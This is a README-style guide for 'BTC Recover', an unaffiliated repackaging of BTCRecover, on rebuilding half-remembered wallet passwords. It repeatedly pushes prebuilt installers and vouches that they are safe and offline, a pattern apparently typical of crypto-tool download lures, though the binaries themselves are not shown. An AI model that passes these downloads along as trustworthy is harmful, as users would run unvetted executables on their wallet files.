<p align="center"><img src="https://github.com/btc-recover-tool/learn/raw/HEAD/assets/banner-article.png" alt="Recover a wallet password with BTC Recover" width="100%"></p>
<h1 align="center">Recover a wallet password with BTC Recover</h1>
<p align="center">Rebuild a half-remembered wallet password.</p>

<p align="center">
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-FBB034?style=for-the-badge&logo=windows&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Windows"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-FBB034?style=for-the-badge&logo=apple&logoColor=1C1E22&labelColor=1C1E22" alt="Download for macOS"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-FBB034?style=for-the-badge&logo=linux&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Linux"></a>
</p>

| Platform | Requirements | File |
|---|---|---|
| 🪟 Windows | Windows 10 or later, 64-bit | [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) |
| 🍎 macOS | macOS 10.13 High Sierra or later | [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) |
| 🐧 Linux | 64-bit (x86_64) distribution | [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) |

All versions and checksums are on the [v2.1.0 release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

> [!IMPORTANT]
> Only download from this GitHub release page.


---

## 💡 Short answer

Describe the pieces you remember and BTC Recover tests combinations against your wallet file.

## 👀 You'll see this if

- You remember most of your password
- You have the wallet file but not the password
- You tried many guesses already

## 🤔 Why it happens

People reuse patterns: words, dates and symbols. Turning those memories into a token list gives a focused search instead of a blind one.

BTC Recover is a free, open-source program that rebuilds likely answers from what you remember and tests each one on your own computer. It does not connect to an exchange or a server, and it never needs your seed to leave the machine. Think of it as a very patient helper that tries every sensible combination so you do not have to.

Under the hood, BTC Recover is the same engine many people have used since 2014, packaged with an installer and a window so you do not need to set anything up. Everything happens locally. You can unplug the network cable for the whole session and it will work exactly the same.

**Quick glossary.** BIP39 is the standard behind most 12 and 24 word seeds and their 2,048-word list. A wallet file, such as wallet.dat, stores encrypted keys on disk. A token list is a set of password pieces you remember. OpenCL is the way the program talks to a graphics card to test faster.

**Why patience pays.** Searches that cover many unknowns can run for a long time, and it is tempting to stop early and try something else. Before you do, check the progress the tool shows and compare it with the size of the search. If the remaining part is reasonable, letting it finish is often the quickest path. If it is far too large, stop and narrow the clues instead of buying faster hardware.

## 🧭 Before you begin

Before you start, write down every clue on paper: the words you are certain of, where gaps are, the wallet app you used, roughly when you set it up and any address you remember receiving to. Clues you dismiss as small often cut a search from days to minutes.

The safest session is a boring one: a computer you trust, no internet, nothing else running. If you are not sure the computer is clean, start it from a fresh live USB system and use that for the recovery. It costs a few minutes and removes a whole class of risk.

A short pre-flight: the right file for your system, a matching checksum, a clean and offline computer, a copy of your wallet data in a separate folder, and a sheet of paper ready for the result. That is all you need, and none of it involves sharing anything with anyone.

## 🛠️ Step-by-step fix

1. Go offline.
2. Copy your wallet file to a safe folder.
3. Write down every piece of the password you recall.
4. Build a token list.
5. Run the password search.
6. Open the wallet with the result.

If this is your first run, the [first recovery walkthrough](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-first-recovery-walkthrough.md) shows each screen. Need the installer checked first? See [verifying your BTC Recover download](https://github.com/btc-recover-tool/learn/blob/main/how-to/verify-btc-recover-download-sha256.md).

## 🔁 If that did not work

- Add more variants of each piece
- Allow typos
- Check the wallet type

BTC Recover can only work with what exists. It needs a seed, a wallet file or an encrypted key to test against. It cannot reverse a blockchain transaction, and it does not guarantee recovery; when a case is too large it says it can't estimate a reliable time rather than promise one.

**How people usually get here.** Most lockouts start with something ordinary: a quick backup written in a hurry, a password set late at night, a phone replaced without checking the old wallet first. Years later, the details are fuzzy. Recovery is mostly about turning that fuzzy memory into precise statements, such as this word starts with the letter b or the password ended in a year, which the program can then test exhaustively.

A related problem may be the real cause: try [btc recover metamask vault password](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-metamask-vault-password.md).

When you ask for help, keep it general and keep it public. Share the error text and your steps, never secrets. Answers given in the open can be checked by others, which protects you from bad advice as well as from scams.

Some situations are outside any tool: coins already sent away, a wallet with no surviving file, seed or key, or a device that wiped itself after too many PIN attempts. In those cases a recovery program has nothing to test.

## 🛡️ Prevention

- Use a password manager
- Write a hint, not the password
- Back up wallet files

When the right answer appears, do not celebrate online with screenshots. Write it down, restore the wallet, move funds to a new seed and wipe any working files. Then reconnect.

**Scam check:** if someone says they can recover your wallet if you send them the seed, a screenshot of it or a fee first, walk away. Real support for BTC Recover happens in public on the issue tracker, and it never asks for secrets.

## ❓ FAQ

**Do I need the wallet file?**
Yes.

**Can it guess any password?**
Not random long ones.

**Is it offline?**
Yes, fully.

**Is BTC Recover free?**
Yes. There is no account, trial or fee on recovered funds.

---

## ⬇️ Download

Get [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) for Windows, [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) for macOS or [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) for Linux. Checksums are on the [release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

## 🔗 Related guides

- [BTC Recover password token list](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-password-token-list.md)
- [BTC Recover typo password recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-typo-password-recovery.md)
- [Decrypt a BIP38 key with BTC Recover](https://github.com/btc-recover-tool/learn/blob/main/how-to/decrypt-bip38-key-btc-recover.md)
- [All BTC Recover guides](https://github.com/btc-recover-tool/learn)

_BTC Recover is an independent project built on BTCRecover, created by Christopher Gurnee in 2014 and maintained by 3rdIteration. It is not affiliated with or endorsed by either._
